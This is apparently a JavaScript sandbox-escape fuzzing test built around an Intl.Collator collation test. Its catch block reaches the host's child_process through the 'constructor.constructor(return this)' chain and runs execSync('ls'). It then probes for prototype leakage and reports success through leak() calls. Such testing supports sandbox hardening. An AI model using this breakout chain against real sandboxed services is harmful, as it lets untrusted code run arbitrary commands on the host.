try {
    function checkCollation(extensionCoValue, usageValue, expectedCollations, expectedUsage) {
        throw () => {
            return () => {
            };
        };
        var requestLocale = extensionCoValue !== undefined ? 'de-DE-u-co-' + extensionCoValue : 'de-DE';
        var options = usageValue !== undefined ? { usage: usageValue } : undefined;
        var collator = new Intl.Collator([requestLocale], options);
        var collation = collator.resolvedOptions().collation;
        assert.notSameValue(expectedCollations.indexOf(collation), -1, (extensionCoValue === undefined ? 'Default collation' : 'Collation for "' + extensionCoValue) + '" should be ' + expectedCollations.join(' or ') + ', but is ' + collation + '.');
        var usage = collator.resolvedOptions().usage;
        assert.sameValue(usage, expectedUsage, (usageValue === undefined ? 'Default usage' : 'Usage') + ' mismatch.');
    }
    checkCollation(undefined, undefined, ['default'], 'sort');
    checkCollation('phonebk', undefined, [
        'phonebk',
        'default'
    ], 'sort');
    checkCollation('invalid', undefined, ['default'], 'sort');
    checkCollation('standard', undefined, ['default'], 'sort');
    checkCollation('standard', 'search', ['default'], 'search');
    checkCollation('standard', 'sort', ['default'], 'sort');
    checkCollation('search', undefined, ['default'], 'sort');
    checkCollation('search', 'search', ['default'], 'search');
    checkCollation('search', 'sort', ['default'], 'sort');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}